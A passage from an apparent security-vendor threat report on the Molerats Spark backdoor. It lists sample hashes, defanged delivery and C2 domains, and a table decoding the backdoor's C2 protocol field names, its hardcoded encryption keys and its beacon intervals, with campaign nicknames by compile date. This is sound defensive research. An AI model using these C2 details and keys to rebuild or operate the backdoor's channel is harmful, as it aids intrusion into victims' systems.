<p>a0ae5cc0659693e4c49d3597d5191923fcfb54040b9b5c8229e4c46b9330c367</p>
<p>8c0966c9518a7ec5bd1ed969222b2bcf9420295450b7ed2f45972e766d26ded8</p>
<p>7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128</p>
<p>64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431</p>
<p>e8d73a94d8ff18c7791bf4547bc4ee2d3f62082c594d3c3cf7d640f7bbd15614</p>
<p>6e60f5c65299ee7f7b257f5c83d3bb36154654b26e721136f7184514fcf6b296</p>
<p>b08b8fddb9dd940a8ab91c9cb29db9bb611a5c533c9489fb99e36c43b4df1eca</p>
<p>a6e0297777ba29e21e5d1acca6210d436eee5c2b93d2dec27910ffd6e2266559</p>
<p>6e896099a3ceb563f43f49a255672cfd14d88799f29617aa362ecd2128446a47</p>
<p>cf32479ed30ae959c4ec8a286bb039425d174062b26054c80572b4625646c551</p>
<p>92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7</p>
<p>5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3</p>
<p>89acce7cdd354a04f2edd4a2226caf5c47246a8196ec1d9b98159da38ec20c24</p>
<p>b654dd768912e09b9c71eb388995b1d69b5baa45e970a6afc42733d647220712</p>
<p>daa72ba2b9525d74e0a3564d0d72e06eed27d04ce63fe98c45b1e84cee09987c</p>
<p>c39e3adb6e15b9964bf0f9702b632086951b4ed9f9fb9cadd6975962a031a398</p>
<p>255a29f88150285a9553f67a6475dc50fcbb5fc737a0178cc0e737d49c8d1b20</p>
<p>4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85</p>
<p>23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c</p>
<p>75336b05443b94474434982fc53778d5e6e9e7fabaddae596af42a15fceb04e9</p>
<p>9a3ec0a8b2a88106fc537d9cae1989f6fba36bb43352a944d2031e7b2ab7673c</p>
<p>89d7337ac102cd80316ad59a1dcfcc5c7849d0e7520f0f85e1781574423e38ea</p>
<p>19ede61c865a3cdd59d3a5d1a79b7ce83ca7828a6b80a2f968d82b5b56a8603c</p>
<p>f9df76f634586c698b967209d83834b98ff3d245d47d6993bfb27a0aa819d9b9</p>
<p>704b19e0460a0fa7d952ba6feb5eadb9054895d1d753df72faf6f470446a0519</p>
<p>194c236a3eed81f3180bdcc5bcbd29b782b1a0ef7962ceb1c4cb892a427563ff</p>
<p>fc420a49b1e9e2200238a4846110c2e4e63bfe6d7088645f49ebb65718a70b7f</p>
<p>bc9353adc58b983b080b61950fc6689ee340797458fc4fd8a1d6f492976aa0e2</p>
<p>8c6dc796b35ef405c42c78e1011cc4a6df09315264d638271cb0674d044886cf</p>
<p>9d49020debdc6ab63de249fd9289d51415395fc8b1e8a15a82f200bf90e674ee</p>
<p>5b6e43d434148bfcf52fd441f64836ae35f4f0ed9d75bf9707f521bcbb7c0380</p>
<p>3a32c81ec609a5466f050c09156f25b5561c691763f865ee437e95a246dcbbe1</p>
<p>c3e23a42dc49b039828da6cef4ebb7226c85163651a69085ee7e1899aa804fed</p>
<p>26b032a9b6a22047eb48f1fb1553827a5b85aa7229422d650fa1f37c48b3aeb1</p>
<p>8e5bf597948ea6ad39f0030053978d1a14e1c3dbb4abf044a223e14544c73b7f</p>
<p>1513032544512718d068b2f6e8b5087cae9fc446e40cd56c03ab7bbbe047add5</p>
<p>d04276760d722c241e831dacee7cf9d63cb123ce7188d604df1c56c1197d7160</p>
<p>83750372d4e8c043d6f916ec398303dc929b59e05b7f5a9dc5485e4530047f4a</p>
<p>23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c</p>
<p>bf4cdb277881754db2f44a014c08ce1857c9c0c47c6c1c8582782b5c887241e2</p>
<p>58376e763ef0ca9dccad55e043794b5ec0b34c8c2a20604cff0b26f216e3c1e2</p>
<p>399344aa609f17e558356709a398b4478e5c737c7cc843e3d111d33192c35e5a</p>
<p>1c43f8f68f7b8e40828f9f74566860b25a5dfd9b7f8b7620d71644866e6cb19d</p>
<p>ab2335ba3abe97a02a3a2d1b063a08ae649406f88d4cf02d22d724e649b9e7be</p>
<p>a4c6aea61953d515d38d75ae7b3ef2a37bb26d1f838722f0a67624d6a728549e</p>
<p>51c1e6ce3ff1f42734bfa19a7142b5154172232afc5528dad4c527df3a44c0c1</p>
<p>329e9e98f08f3d6a017254dd033984cfd6421ccab5b323ebace5d68662a98a09</p>
<p>0631ed0995e21ec8f02f6167824eca92e84abfd8cf4dbbd9c7c88f88d4f570cd</p>
<p>d010ef2b6664779b3c8cfa0a5179b7331d88d34d04350ebeeecb3bae65654393</p>
<p>4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85</p>
<p>51042cac30b4d6072f79b3f9b27d8ee7b65f438549c90f57dc5fecc17d35054a</p>
<p>ec0d30d2fdd301bf0cfe66028c9a37d5535a8161909d0d3573447d1843f61c97</p>
<p>e6e5593cbac23ec5c51e5f63c4c6616a8eb71697a89f9d1d17cc7be91c36e3e9</p>
<p>36166db096ddb50af4f5c4be48b4274c535f40c74ce3450d4ad3bdaa2c28beb3</p>
<p>966ad6452793b1562f0081456a951d3310d4e7690fa74ef8ff4046778bd37168</p>
<p>b2437a54195d51435ad07867a5cb069e831fdd8e48bb70daa3894fde40754bc8</p>
<p>fe19ab4fd65531163d197d565201c2afea7d9f8e74e5f75c714eb5fe086a02fd</p>
<p>212aa6e3f236550bb4b9328071ee4f0e8a74465c75dcf1e6cde8502afde91364</p>
<p>e489e5297ed8cf594c2a5160eff79b12b9ee68e36e0d00ed31f44b75c4a38f61</p>
<p>0eebc31bb64ba0aa0ea335a5f35392ff1d058e97bf5cb5b46d7a89b197dcba7a</p>
<p>fe0f23d6675260dd40f277906aa3dd34cbef2243336334dda10ad4500f8e6883</p>
<p>7c5a9ce04002be953c556b5b50c10f8d462abc92d1ffe28a325d7ea741701be1</p>
<p>45a2c50edd710476e0de8ece6cc5931035ce8183ac4cf521d494d94744d44c2c</p>
<p>b84f2497e4cfeac240b1815b22741609e5a31f0be11667a3c7256c16788728ec</p>
<p>78696cf4370817cb0ffd6930a92553d3551fe77cdc6d45638ddd13f05b9218b8</p>
<p>5109f2c8f014698f1d2f0d59a7c9cc1cd9400a6fe4dcde95cc475f453e74bc6e</p>
<p>ab4e43b4e526d44bf12ae5113184afdf5c15630808f674f5e1a472eb6811ce3f</p>
<p>daa72ba2b9525d74e0a3564d0d72e06eed27d04ce63fe98c45b1e84cee09987c</p>
<p>64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431</p>
<p>6e60f5c65299ee7f7b257f5c83d3bb36154654b26e721136f7184514fcf6b296</p>
<p>B08b8fddb9dd940a8ab91c9cb29db9bb611a5c533c9489fb99e36c43b4df1eca</p>
<p>cf32479ed30ae959c4ec8a286bb039425d174062b26054c80572b4625646c551</p>
<p>9511940ed52775aef969fba004678f4c142b33e2dd631a0e8f4e536ab0b811db</p>
<p>e3779f6252ca606ace9ae06623ba086d1a441582b625e433799260d71cdb1b4b</p>
<p>e6e9f7b0449976537d9276192e5767c9909cd34df028a8bf1cac3dbe490f0e73</p>
<p>69df8e4bdc3fd69deb6c866254f80f6288549222ed0d07ccd4c05597e75414df</p>
<p>40b7a1e8c00deb6d26f28bbdd3e9abe0a483873a4a530742bb65faace89ffd11</p>
<h3>Related Delivery Domains</h3>
<p>servicebios[.]com</p>
<p>dapoerwedding[.]com</p>
<p>zmartco[.]com</p>
<h3>Spark C2 Domains</h3>
<p>webtutorialz[.]com</p>
<p>nysura[.]com</p>
<p>laceibagrafica[.]com</p>
<p>motoqu[.]com</p>
<p>smartweb9[.]com</p>
<p>laptower[.]com</p>
<p>app.msexchanges16[.]com</p>
<p>msexchange13[.]com</p>
<p>cloudserviceapi[.]online</p>
<p>updates.masterservices[.]online</p>
<p>clients.itresolver[.]online</p>
<p>update.itresolver[.]online</p>
<p>91.219.237[.]99</p>
<p>goldenlines[.]site</p>
<p>Update.nextdata[.]site</p>
<h2><a id="post-105134-_4eh4ko1eun25"></a>Spark First Names and More</h2>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 182.685px;"><strong>Decrypted String</strong></td>
<td style="width: 75.2778px;"><strong>Usage</strong></td>
<td style="width: 602.685px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 182.685px;">Lawrence</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name in dictionary (JaseN) used to store the value of a task number provided in the Ivory field</td>
</tr>
<tr>
<td style="width: 182.685px;">Allier</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name used to store a number for an unknown purpose, but it is expected as a response to the MorganE communication type.</td>
</tr>
<tr>
<td style="width: 182.685px;">JaseN</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name for a list of dictionaries in the MorganE communication type, represents the received task numbers</td>
</tr>
<tr>
<td style="width: 182.685px;">Ivory</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name in the Jordanlzw list used to store a number that we believe is a task number</td>
</tr>
<tr>
<td style="width: 182.685px;">Jonas</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name in the Jordanlzw list used to store a boolean for an unknown reason</td>
</tr>
<tr>
<td style="width: 182.685px;">Reginacy</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name in the Jordanlzw list used to store a boolean to not create the process, rather just send 'ok' back to C2</td>
</tr>
<tr>
<td style="width: 182.685px;">TrumanRd</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name in the Jordanlzw list used to store the command line arguments to run with an executable</td>
</tr>
<tr>
<td style="width: 182.685px;">Alanih</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name in the Jordanlzw list used to store the executable to to run</td>
</tr>
<tr>
<td style="width: 182.685px;">Averizt</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name that stores a number in the VanessaFM communication type that is hardcoded within the binary.</td>
</tr>
<tr>
<td style="width: 182.685px;">MathiasNbo</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name for a list of dictionaries in the VanessaFM communication type</td>
</tr>
<tr>
<td style="width: 182.685px;">BrandentlK</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name that stores a number in the VanessaFM communication type that is hardcoded into the configuration.</td>
</tr>
<tr>
<td style="width: 182.685px;">AdalynngS</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name in dictionary (MathiasNbo) used to store a number with unknown purpose.</td>
</tr>
<tr>
<td style="width: 182.685px;">AdelineRD</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name that stores a base64 encoded encrypted string obtained from the payload configuration sent to the C2 in the VanessaFM communication type. Considered as a nickname or campaign/payload identifier.</td>
</tr>
<tr>
<td style="width: 182.685px;">CollinsPM</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name in dictionary (MathiasNbo) used to store the UUID also seen in the ZaydenlnL field</td>
</tr>
<tr>
<td style="width: 182.685px;">Nevaeh</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name in dictionary (MathiasNbo) used to store a boolean with unknown purpose.</td>
</tr>
<tr>
<td style="width: 182.685px;">LondonzO</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name in the Jordanlzw list used to store a boolean to create a specified process and wait for return</td>
</tr>
<tr>
<td style="width: 182.685px;">JoslynKe</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Value in ReeceWNM field to represent the transmission of system information</td>
</tr>
<tr>
<td style="width: 182.685px;">AngelxEv</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name used in a system information dictionaries (Maximiliano) to store the information type value (1 = UUID, 2 = hostname, 3 = username)</td>
</tr>
<tr>
<td style="width: 182.685px;">ZaydenlnL</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name used in a system information dictionaries (Maximiliano) to store the data associated with the type specified in AngelxEv</td>
</tr>
<tr>
<td style="width: 182.685px;">Houstonod</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name used in a system information dictionaries (Maximiliano) to store the value "1" whose purpose is unknown</td>
</tr>
<tr>
<td style="width: 182.685px;">Maximiliano</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name in JoslynKe communication type that stores a list of system information dictionaries</td>
</tr>
<tr>
<td style="width: 182.685px;">Garrison</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name for a number value used by the payload possibly as a sleep interval before sending results of additional commands.</td>
</tr>
<tr>
<td style="width: 182.685px;">Zeke</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name for a list of dictionaries in the Winston communications type</td>
</tr>
<tr>
<td style="width: 182.685px;">ReesefP</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name within a dictionary within the Zeke array used to represent the task number</td>
</tr>
<tr>
<td style="width: 182.685px;">FrederickT</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name within a dictionary within the Zeke array storing the results of the executed command for the task</td>
</tr>
<tr>
<td style="width: 182.685px;">KaileeXws</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Key name within a dictionary within the Zeke array storing the boolean if the execution was successful</td>
</tr>
<tr>
<td style="width: 182.685px;">EverlyY</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name for a number value used by the payload to idle for a specified number of seconds</td>
</tr>
<tr>
<td style="width: 182.685px;">CallieVK</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Field in JSON sent to C2, used to store the communicated data</td>
</tr>
<tr>
<td style="width: 182.685px;">ReeceWNM</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Field in JSON sent to C2, used to store the communication type</td>
</tr>
<tr>
<td style="width: 182.685px;">MorganE</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Value in ReeceWNM field to represent the task number its about to send data regarding</td>
</tr>
<tr>
<td style="width: 182.685px;">Winston</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Value in ReeceWNM field to represent the transmission of command execution results</td>
</tr>
<tr>
<td style="width: 182.685px;">Jessicay</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Value in ReeceWNM field to represent the beacon</td>
</tr>
<tr>
<td style="width: 182.685px;">VanessaFM</td>
<td style="width: 75.2778px;">C2 Channel (from payload)</td>
<td style="width: 602.685px;">Value in ReeceWNM field to represent the request for additional tasks</td>
</tr>
<tr>
<td style="width: 182.685px;">rEA8GPZf4oIdOsjMxgFD</td>
<td style="width: 75.2778px;">Key</td>
<td style="width: 602.685px;">Used to encrypt fields within JSON sent to C2, including system information gathered</td>
</tr>
<tr>
<td style="width: 182.685px;">Jordanlzw</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name of a list of dictionaries that store commands to run</td>
</tr>
<tr>
<td style="width: 182.685px;">Aryana</td>
<td style="width: 75.2778px;">C2 Channel (from C2)</td>
<td style="width: 602.685px;">Key name for a number value used to specify the number of commands to run that are stored in the Jordanlzw list</td>
</tr>
<tr>
<td style="width: 182.685px;">24</td>
<td style="width: 75.2778px;">Config</td>
<td style="width: 602.685px;">Minimum sleep interval between messages sent to C2</td>
</tr>
<tr>
<td style="width: 182.685px;">119</td>
<td style="width: 75.2778px;">Config</td>
<td style="width: 602.685px;">Minimum sleep interval between failed C2 beacons</td>
</tr>
<tr>
<td style="width: 182.685px;">JvFLb8pHNywoGdhtjsc5</td>
<td style="width: 75.2778px;">Key</td>
<td style="width: 602.685px;">Used to encrypt C2 communications</td>
</tr>
</tbody>
</table>
<h2>Spark Nicknames/Campaign Codes</h2>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 143.426px;"><strong>SHA256</strong></td>
<td style="width: 149.352px;"><strong>Compile Time</strong></td>
<td style="width: 84.1667px;"><strong>Nickname</strong></td>
</tr>
<tr>
<td style="width: 143.426px;">0631ed0995e21ec..</td>
<td style="width: 149.352px;">2017-03-27 2:46:06</td>
<td style="width: 84.1667px;">28-10</td>
</tr>
<tr>
<td style="width: 143.426px;">966ad6452793b15..</td>
<td style="width: 149.352px;">2017-05-24 6:15:04</td>
<td style="width: 84.1667px;">Nick name</td>
</tr>
<tr>
<td style="width: 143.426px;">212aa6e3f236550..</td>
<td style="width: 149.352px;">2017-05-24 6:15:04</td>
<td style="width: 84.1667px;">Nick name</td>
</tr>
<tr>
<td style="width: 143.426px;">ab4e43b4e526d44..</td>
<td style="width: 149.352px;">2017-05-24 6:15:04</td>
<td style="width: 84.1667px;">Nick name</td>
</tr>
<tr>
<td style="width: 143.426px;">36166db096ddb50..</td>
<td style="width: 149.352px;">2017-10-07 7:06:22</td>
<td style="width: 84.1667px;">bbb</td>
</tr>
<tr>
<td style="width: 143.426px;">d010ef2b6664779..</td>
<td style="width: 149.352px;">2017-10-07 7:06:23</td>
<td style="width: 84.1667px;">28-10</td>
</tr>
<tr>
<td style="width: 143.426px;">194c236a3eed81f..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">sss</td>
</tr>
<tr>
<td style="width: 143.426px;">fc420a49b1e9e22..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">sss</td>
</tr>
<tr>
<td style="width: 143.426px;">bc9353adc58b983..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">sss</td>
</tr>
<tr>
<td style="width: 143.426px;">9d49020debdc6ab..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">Nick name</td>
</tr>
<tr>
<td style="width: 143.426px;">3a32c81ec609a54..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">3007</td>
</tr>
<tr>
<td style="width: 143.426px;">c3e23a42dc49b03..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">50852</td>
</tr>
<tr>
<td style="width: 143.426px;">8e5bf597948ea6a..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">O</td>
</tr>
<tr>
<td style="width: 143.426px;">151303254451271..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">Nick name</td>
</tr>
<tr>
<td style="width: 143.426px;">83750372d4e8c04..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">0204</td>
</tr>
<tr>
<td style="width: 143.426px;">58376e763ef0ca9..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">R</td>
</tr>
<tr>
<td style="width: 143.426px;">1c43f8f68f7b8e4..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">ood</td>
</tr>
<tr>
<td style="width: 143.426px;">ab2335ba3abe97a..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">Nick name</td>
</tr>
<tr>
<td style="width: 143.426px;">a4c6aea61953d51..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">Nick name</td>
</tr>
<tr>
<td style="width: 143.426px;">329e9e98f08f3d6..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">FUD</td>
</tr>
<tr>
<td style="width: 143.426px;">78696cf4370817c..</td>
<td style="width: 149.352px;">2017-10-22 7:03:45</td>
<td style="width: 84.1667px;">Ben</td>
</tr>
<tr>
<td style="width: 143.426px;">ec0d30d2fdd301b..</td>
<td style="width: 149.352px;">2017-10-28 10:55:21</td>
<td style="width: 84.1667px;">28-10</td>
</tr>
<tr>
<td style="width: 143.426px;">9511940ed52775a..</td>
<td style="width: 149.352px;">2017-12-02 11:16:24</td>
<td style="width: 84.1667px;">&lt;blank&gt;</td>
</tr>
<tr>
<td style="width: 143.426px;">5139a334d5629c5..</td>
<td style="width: 149.352px;">2019-09-16 10:00:45</td>
<td style="width: 84.1667px;">bnvcs</td>
</tr>
<tr>
<td style="width: 143.426px;">89acce7cdd354a0..</td>
<td style="width: 149.352px;">2019-09-16 10:00:45</td>
<td style="width: 84.1667px;">Docx</td>
</tr>
<tr>
<td style="width: 143.426px;">b654dd768912e09..</td>
<td style="width: 149.352px;">2019-09-16 10:00:45</td>
<td style="width: 84.1667px;">2909</td>
</tr>
<tr>
<td style="width: 143.426px;">daa72ba2b9525d7..</td>
<td style="width: 149.352px;">2019-09-16 10:00:45</td>
<td style="width: 84.1667px;">PalCamp</td>
</tr>
<tr>
<td style="width: 143.426px;">69df8e4bdc3fd69..</td>
<td style="width: 149.352px;">2019-09-16 10:00:45</td>
<td style="width: 84.1667px;">NewsMac</td>
</tr>
<tr>
<td style="width: 143.426px;">cf32479ed30ae95..</td>
<td style="width: 149.352px;">2019-12-30 9:45:44</td>
<td style="width: 84.1667px;">1401</td>
</tr>
<tr>
<td style="width: 143.426px;">64ea1f1e0352f3d..</td>
<td style="width: 149.352px;">2020-01-12 10:57:50</td>
<td style="width: 84.1667px;">FS1-2020</td>
</tr>
<tr>
<td style="width: 143.426px;">6e60f5c65299ee7..</td>
<td style="width: 149.352px;">2020-01-12 10:57:50</td>
<td style="width: 84.1667px;">1801</td>
</tr>
<tr>
<td style="width: 143.426px;">b08b8fddb9dd940..</td>
<td style="width: 149.352px;">2020-01-12 10:57:50</td>
<td style="width: 84.1667px;">FS1-2020</td>
</tr>
<tr>
<td style="width: 143.426px;">04fa6aaea5e3a26..</td>
<td style="width: 149.352px;">2020-01-12 10:57:50</td>
<td style="width: 84.1667px;">up</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
      
              </div>
              <!--<span class="post__date">Updated 7 June, 2024 at 7:15 AM PDT</span>-->
              <button class="l-btn back-to-top" id="backToTop" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:back to top">Back to top</button>
              
			<div class="be__tags-wrapper"> 
				<h3>Tags</h3><ul role="list"><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/gaza-hacking-team/" role="link" title="Gaza Hacking Team" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:tags:Gaza Hacking Team">Gaza Hacking Team</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/jhonerat/" role="link" title="JhoneRAT" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:tags:JhoneRAT">JhoneRAT</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/macros/" role="link" title="Macros" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:tags:Macros">Macros</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/molerats/" role="link" title="MoleRats" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:tags:MoleRats">MoleRats</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/spark/" role="link" title="Spark" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:tags:Spark">Spark</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/spear-phishing/" role="link" title="Spear Phishing" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:tags:Spear Phishing">Spear Phishing</a></li></ul>
			</div> 
              <div class="be__post-nav">
    <a class="prev" href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:article-nav:Threat Research Center"> 
        <span>Threat Research Center</span>
    </a>
            <a class="next" href="https://unit42.paloaltonetworks.com/cortex-xdr-detects-netsupport-manager-rat-campaign/" role="link" title="Cortex XDR™ Detects New Phishing Campaign Installing NetSupport Manager RAT" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:article-nav:Cortex XDR™ Detects New Phishing Campaign Installing NetSupport Manager RAT"> 
            <span>Next: Cortex XDR™ Detects New Phishing Campaign Installing NetSupport Manager RAT</span>
        </a>
    </div>
 
            </div>
            <div class="be__nav">
            <div class="be__nav-wrapper">
      <div class="be-table-of-contents" data-toc-track="molerats-delivers-spark-backdoor:sidebar:table-of-contents">
      <div class="be-title__wrapper">
        <h3>Table of Contents</h3>
      </div> 
            <ul>
        <li></li>
      </ul>
    </div>
   
        <div class="be-related-articles">
        <h3>Related Articles</h3>
        <ul> 
                        <li>
                  <a href="https://unit42.paloaltonetworks.com/kimsuky-new-keylogger-backdoor-variant/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:sidebar:related-articles:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy">
                      Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy                  </a>
              </li>
                            <li>
                  <a href="https://unit42.paloaltonetworks.com/unit-42-scpc-ssscip-uncover-smoke-loader-phishing/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:sidebar:related-articles:Unit 42 Collaborative Research With Ukraine’s Cyber Agency To Uncover the Smoke Loader Backdoor">
                      Unit 42 Collaborative Research With Ukraine’s Cyber Agency To Uncover the Smoke Loader Backdoor                  </a>
              </li>
                            <li>
                  <a href="https://unit42.paloaltonetworks.com/excel-add-ins-dridex-infection-chain/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:sidebar:related-articles:Weaponization of Excel Add-Ins Part 2: Dridex Infection Chain Case Studies">
                      Weaponization of Excel Add-Ins Part 2: Dridex Infection Chain Case Studies                  </a>
              </li>
                      </ul>
      </div>
      </div> 
            </div>
          </div>
        </div>
          <div class="pa related-threat">
    <div class="l-container">
            <h2>Related Malware Resources</h2>
      <div class="blog-slider" id="blogSlider"> 
                    <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900-786x368.jpg" class="attachment-medium size-medium" alt="Pictorial representation of a campaign like Contagious Interview. Digital graphic of a glowing globe with network connections and data streams, symbolizing global connectivity and technology advancements." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware:Threat Research"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                  <a href="https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware">
                    <h4 class="post-title">Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/north-korea/" title="North Korea" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware:North Korea">North Korea</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/social-engineering/" title="social engineering" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware:social engineering">Social engineering</a>
				</li>
				<li role="listitem">
